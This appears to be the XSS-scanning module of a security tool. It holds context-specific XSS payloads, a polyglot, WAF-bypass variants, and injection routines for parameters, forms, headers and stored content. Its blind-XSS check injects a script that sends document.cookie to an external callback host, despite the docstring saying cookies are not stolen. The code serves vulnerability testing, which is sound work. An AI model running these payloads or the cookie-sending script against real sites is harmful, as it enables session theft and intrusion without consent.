# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_xss.py - XSS scanner (ZAP-class): reflected, stored, DOM, polyglot, OAST.

Prinsip:
- Deteksi, bukan eksploitasi (tidak mencuri cookie)
- Tidak auto-execute JS berbahaya
- Payload unik per test (marker) untuk hindari false positive
- Support GET parameter, POST form, header, JSON body
"""

import random
import re
import string
import time
import requests
import urllib3
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

urllib3.disable_warnings()


# =========================================================
# PAYLOAD LIBRARY
# =========================================================
def _rand_marker(prefix="XSS"):
    return prefix + "_" + "".join(random.choices(string.ascii_lowercase, k=8))


def _ctx_payloads(marker):
    """Payload per konteks HTML."""
    return {
        "html": [
            f'<script>window.__{marker}=1</script>',
            f'<img src=x onerror="window.__{marker}=1">',
            f'<svg/onload="window.__{marker}=1">',
            f'<body onload="window.__{marker}=1">',
            f'<iframe srcdoc="<script>window.__{marker}=1</script>">',
            f'<details open ontoggle="window.__{marker}=1">',
        ],
        "attr_double": [
            f'" onmouseover="window.__{marker}=1" x="',
            f'" autofocus onfocus="window.__{marker}=1" x="',
        ],
        "attr_single": [
            f"' onmouseover='window.__{marker}=1' x='",
            f"' autofocus onfocus='window.__{marker}=1' x='",
        ],
        "attr_unquoted": [
            f' onmouseover=window.__{marker}=1 x=',
            f' autofocus onfocus=window.__{marker}=1 x=',
        ],
        "js_string": [
            f"';window.__{marker}=1;//",
            f'";window.__{marker}=1;//',
            f"\\';window.__{marker}=1;//",
        ],
        "js_template": [
            f"${{window.__{marker}=1}}",
            f"`+window.__{marker}+`",
        ],
        "url": [
            f"javascript:window.__{marker}=1",
            f"data:text/html,<script>window.__{marker}=1</script>",
        ],
    }


def _polyglot(marker):
    """Polyglot XSS payload — coba banyak konteks sekaligus."""
    return (
        f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=window.__{marker}=1 )//'
        f'%%0D%%0A%%0d%%0a0//;alert`1`//'
    )


def _waf_bypass_variants(payload):
    """Variant payload untuk bypass WAF dasar."""
    variants = [payload]
    # Case variation
    variants.append(payload.replace("<script>", "<ScRiPt>")
                    .replace("</script>", "</ScRiPt>"))
    # URL encoding
    variants.append(payload.replace("<", "%3C").replace(">", "%3E"))
    # HTML entity
    variants.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
    # Null byte
    variants.append(payload.replace(">", "%00>"))
    # Tab/newline dalam tag
    variants.append(re.sub(r"<(\w+)", r"<\1\t", payload))
    return variants


# =========================================================
# CONTEXT DETECTION
# =========================================================
def _detect_context(html, marker):
    """Deteksi konteks saat marker muncul di response."""
    if not html or marker not in html:
        return None

    idx = html.find(marker)
    if idx < 0:
        return None

    # Ambil 200 char sebelum marker
    before = html[max(0, idx - 200):idx]
    after = html[idx:idx + 200]

    # Cek konteks
    # Di dalam <script>?
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        # Di dalam string JS?
        last_quote = max(before.rfind("'"), before.rfind('"'), before.rfind("`"))
        if last_quote >= 0:
            quote = before[last_quote]
            if before.count(quote) % 2 == 1:
                return "js_string"
        return "js_code"

    # Di dalam atribut?
    last_attr_open = max(before.rfind('"'), before.rfind("'"))
    if last_attr_open >= 0:
        # Cek apakah masih dalam tag
        last_tag_open = before.rfind("<")
        last_tag_close = before.rfind(">")
        if last_tag_open > last_tag_close:
            quote = before[last_attr_open]
            # Double/single quote
            if before.count(quote) % 2 == 1:
                if quote == '"':
                    return "attr_double"
                return "attr_single"

    # Di luar tag
    if before.rfind("<") < before.rfind(">"):
        return "html"

    return "html"


# =========================================================
# REFLECTED XSS
# =========================================================
def _inject_get(url, param, payload, timeout=10):
    """Inject payload ke GET parameter."""
    try:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_qs = urlencode(qs, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_qs))
        r = requests.get(new_url, timeout=timeout, verify=False)
        return r
    except Exception:
        return None


def _inject_post(url, data, payload_param, payload, timeout=10):
    """Inject payload ke POST form."""
    try:
        new_data = dict(data)
        new_data[payload_param] = payload
        r = requests.post(url, data=new_data, timeout=timeout, verify=False)
        return r
    except Exception:
        return None


def _inject_header(url, header, payload, timeout=10):
    try:
        r = requests.get(url, headers={header: payload},
                         timeout=timeout, verify=False)
        return r
    except Exception:
        return None


def scan_reflected(url, params=None, data=None, headers=None,
                   timeout=10, use_oast=False, oast_client=None):
    """Scan reflected XSS.

    Return list dict {param, payload, context, method, severity, evidence}.
    """
    findings = []
    base = url.rstrip("/") if url.endswith("/") else url

    # Deteksi parameter kalau tidak disediakan
    if not params and not data:
        from urllib.parse import parse_qs, urlparse
        qs = urlparse(base).query
        params = list(parse_qs(qs).keys()) or ["q", "s", "search", "query"]

    # Test GET params
    if params:
        for param in params[:20]:
            for ctx_name, payloads in _ctx_payloads(_rand_marker()).items():
                for payload_tpl in payloads[:2]:  # batasi 2 per konteks
                    marker = _rand_marker()
                    payload = payload_tpl.replace(
                        payload_tpl.split("window.__")[1].split("=")[0],
                        marker) if "window.__" in payload_tpl else payload_tpl

                    r = _inject_get(base, param, payload, timeout=timeout)
                    if not r:
                        continue

                    # Cek refleksi
                    if marker not in r.text:
                        continue

                    # Cek konteks aktual
                    ctx = _detect_context(r.text, marker)

                    # Kalau refleksi terjadi tanpa escape = vulnerable
                    # Heuristik: payload asli muncul utuh
                    if payload in r.text:
                        findings.append({
                            "param": param,
                            "payload": payload[:100],
                            "context": ctx or "html",
                            "method": "GET",
                            "severity": "high",
                            "evidence": f"Payload reflected in context '{ctx}'",
                            "url": r.url,
                        })
                        break
                    # Polyglot fallback
                    poly = _polyglot(marker)
                    r2 = _inject_get(base, param, poly, timeout=timeout)
                    if r2 and marker in r2.text and poly in r2.text:
                        findings.append({
                            "param": param,
                            "payload": poly[:100],
                            "context": "polyglot",
                            "method": "GET",
                            "severity": "high",
                            "evidence": "Polyglot reflected",
                            "url": r2.url,
                        })

    # Test POST form
    if data:
        for param in list(data.keys())[:20]:
            marker = _rand_marker()
            payload = f'<img src=x onerror="window.__{marker}=1">'
            r = _inject_post(base, data, param, payload, timeout=timeout)
            if r and marker in r.text and payload in r.text:
                ctx = _detect_context(r.text, marker)
                findings.append({
                    "param": param,
                    "payload": payload[:100],
                    "context": ctx or "html",
                    "method": "POST",
                    "severity": "high",
                    "evidence": f"POST form reflected in '{ctx}'",
                    "url": r.url,
                })

    # Test common headers (XSS via header reflection)
    if headers:
        header_list = list(headers.keys())
    else:
        header_list = ["User-Agent", "Referer"]

    for h in header_list[:5]:
        marker = _rand_marker()
        payload = f'<img src=x onerror="window.__{marker}=1">'
        r = _inject_header(base, h, payload, timeout=timeout)
        if r and marker in r.text and payload in r.text:
            findings.append({
                "param": h,
                "payload": payload[:100],
                "context": "header",
                "method": "HEADER",
                "severity": "medium",
                "evidence": f"Header '{h}' reflected",
                "url": r.url,
            })

    # OAST verify (blind XSS)
    if use_oast and oast_client:
        try:
            oast_url = getattr(oast_client, "url", None)
            if oast_url:
                marker = _rand_marker("OAST")
                cb = f"{oast_url}/{marker}"
                blind_payload = (
                    f'<script>fetch("{cb}?c="+document.cookie)</script>'
                )
                for param in (params or [])[:5]:
                    _inject_get(base, param, blind_payload, timeout=timeout)
                time.sleep(3)
                hits = oast_client.poll()
                if hits:
                    findings.append({
                        "param": "OAST",
                        "payload": blind_payload[:100],
                        "context": "blind",
                        "method": "OAST",
                        "severity": "critical",
                        "evidence": f"Blind XSS confirmed via OAST: {marker}",
                    })
        except Exception:
            pass

    return findings


# =========================================================
# DOM XSS
# =========================================================
DOM_SINKS = [
    r"innerHTML", r"outerHTML", r"document\.write", r"document\.writeln",
    r"eval\s*\(", r"setTimeout\s*\(", r"setInterval\s*\(",
    r"Function\s*\(", r"location\s*=", r"location\.href",
    r"window\.location", r"\.html\s*\(", r"\.append\s*\(",
    r"\.after\s*\(", r"\.before\s*\(", r"\.prepend\s*\(",
]

DOM_SOURCES = [
    r"location\.hash", r"location\.search", r"location\.href",
    r"document\.URL", r"document\.documentURI", r"document\.referrer",
    r"window\.name", r"postMessage", r"localStorage", r"sessionStorage",
    r"document\.cookie", r"URLSearchParams",
]


def scan_dom(url, timeout=10):
    """Analisa source → sink di HTML/JS. Return list finding."""
    findings = []
    try:
        r = requests.get(url, timeout=timeout, verify=False)
        html = r.text or ""
    except Exception:
        return findings

    # Ekstrak inline script
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)

    sources = [s for s in DOM_SOURCES if re.search(s, html, re.I)]
    sinks = [s for s in DOM_SINKS if re.search(s, html, re.I)]

    if sources and sinks:
        findings.append({
            "type": "dom_xss_potential",
            "severity": "medium",
            "sources": [s.replace("\\", "") for s in sources][:5],
            "sinks": [s.replace("\\", "") for s in sinks][:5],
            "evidence": f"Source: {', '.join(s[:30] for s in sources[:3])}; "
                        f"Sink: {', '.join(s[:30] for s in sinks[:3])}",
            "url": url,
        })

    # Cek inline event handlers dengan sink
    inline_handlers = re.findall(
        r'on\w+\s*=\s*["\']([^"\']*?(?:eval|innerHTML|document\.write)[^"\']*)["\']',
        html, re.I)
    for h in inline_handlers[:5]:
        findings.append({
            "type": "dom_inline_handler",
            "severity": "low",
            "evidence": f"Inline handler with sink: {h[:80]}",
            "url": url,
        })

    return findings


# =========================================================
# STORED XSS
# =========================================================
def scan_stored(form_url, form_data, check_url, param=None,
                timeout=10, poll_wait=2):
    """Cek stored XSS: submit payload, lalu fetch check_url (halaman yang render).

    Return list finding.
    """
    findings = []
    marker = _rand_marker("STORED")
    payload = f'<img src=x onerror="window.__{marker}=1">'

    try:
        data = dict(form_data)
        if param:
            data[param] = payload
        else:
            # Coba semua field string
            for k, v in list(data.items()):
                if isinstance(v, str):
                    data[k] = payload
                    break

        r = requests.post(form_url, data=data, timeout=timeout, verify=False)
        if r.status_code not in (200, 201, 302):
            return findings

        time.sleep(poll_wait)

        # Cek di halaman render
        r2 = requests.get(check_url, timeout=timeout, verify=False)
        if marker in r2.text and payload in r2.text:
            findings.append({
                "type": "stored_xss",
                "severity": "high",
                "param": param or "form",
                "payload": payload[:100],
                "evidence": f"Stored XSS in {check_url}",
                "url": check_url,
            })
    except Exception:
        pass

    return findings


# =========================================================
# MAIN ENTRY
# =========================================================
def scan(url, params=None, data=None, headers=None,
         timeout=10, check_dom=True, check_stored=False,
         stored_check_url=None, use_oast=False, oast_client=None):
    """Scan XSS lengkap. Return dict {findings, scanned}."""
    findings = []
    scanned = []

    # 1. Reflected
    try:
        refl = scan_reflected(url, params=params, data=data, headers=headers,
                              timeout=timeout, use_oast=use_oast,
                              oast_client=oast_client)
        findings.extend(refl)
        scanned.append(("reflected", len(refl)))
    except Exception:
        pass

    # 2. DOM
    if check_dom:
        try:
            dom = scan_dom(url, timeout=timeout)
            findings.extend(dom)
            scanned.append(("dom", len(dom)))
        except Exception:
            pass

    # 3. Stored (opt-in — butuh URL form + URL render)
    if check_stored and stored_check_url and data:
        try:
            stored = scan_stored(url, data, stored_check_url,
                                 timeout=timeout)
            findings.extend(stored)
            scanned.append(("stored", len(stored)))
        except Exception:
            pass

    return {
        "findings": findings,
        "scanned": scanned,
        "total": len(findings),
    }


def status():
    return {
        "payloads": sum(len(v) for v in _ctx_payloads("x").values()),
        "contexts": list(_ctx_payloads("x").keys()),
        "types": ["reflected", "dom", "stored", "oast-blind"],
        "features": ["waf_bypass", "polyglot", "header_reflection"],
    }
